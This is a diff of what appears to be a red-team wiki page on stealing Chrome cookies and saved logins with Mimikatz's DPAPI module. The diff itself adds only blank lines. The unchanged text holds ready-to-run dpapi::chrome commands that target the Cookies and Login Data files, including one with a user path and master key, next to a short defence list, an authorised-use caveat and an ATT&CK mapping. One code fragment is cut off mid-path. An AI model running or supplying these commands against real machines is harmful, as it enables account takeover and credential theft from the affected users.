@@ -36,11 +36,15 @@ Stealing Chrome cookies and credentials with Mimikatz is a common technique used
 
 From a technical perspective, this technique involves using Mimikatz to execute commands that retrieve the encrypted credentials from the Windows Credential Manager, and then using Mimikatz again to decrypt them using the DPAPI. Business value of this technique is that it allows attackers to gain access to sensitive data stored in the browser, such as login credentials, which can be used to gain access to other systems and applications that the user has access to.
 
+ 
+
 ## Requirements
 
 1. Access to a Windows machine with Mimikatz installed
 
 1. Administrative privileges on the target machine
+
+ 
 
 ## Defense
 
@@ -50,11 +54,15 @@ From a technical perspective, this technique involves using Mimikatz to execute 
 
 1. Monitor for signs of Mimikatz usage and other credential dumping techniques
 
+ 
+
 ## Objectives
 
 1. Retrieve Chrome cookies and saved credentials from the Windows Credential Manager
 
 1. Decrypt the credentials using the DPAPI
+
+ 
 
 # Instructions
 
@@ -64,10 +72,18 @@ From a technical perspective, this technique involves using Mimikatz to execute 
 2. dpapi::chrome /in:"C:\Users\kbell\AppData\Local\Google\Chrome\User Data\Default\Cookies" /masterkey:9a6f199e3d2e698ce78fdeeefadc85c527c43b4e3c5518c54e95718842829b12912567ca0713c4bd0cf74743c81c1d32bbf10020c9d72d58c99e731814e4155b
 3. dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect
 
+ 
+
+
+
 **Code**: [[# Saved Cookies
 dpapi::chrome /in:"%localappdata%\]]
 
+
+
 > These commands use the Data Protection API (DPAPI) to decrypt and display the saved cookies and credentials in Google Chrome. The first command retrieves the cookies from the default Chrome profile, while the second command retrieves the cookies from a specific user profile by providing the master key. The third command retrieves the saved credentials from the default Chrome profile. Note that these commands should only be run on a system that you own or have explicit permission to access, as they can potentially expose sensitive information.
+
+
 
 **Command** ([[Decrypt Chrome Cookies]]):
 
@@ -76,11 +92,17 @@ dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Cookies" /unpr
 dpapi::chrome /in:"C:\Users\kbell\AppData\Local\Google\Chrome\User Data\Default\Cookies" /masterkey:9a6f199e3d2e698ce78fdeeefadc85c527c43b4e3c5518c54e95718842829b12912567ca0713c4bd0cf74743c81c1d32bbf10020c9d72d58c99e731814e4155b
 ```
 
+
+
+
+
 **Command** ([[Decrypt Chrome Credentials]]):
 
 ```bash
 dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -107,3 +129,5 @@ dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /u
 - [[Chrome Cookies & Credential]]
 - [[Credential Manager & DPAPI]]
 - [[Windows - Mimikatz]]
+
+
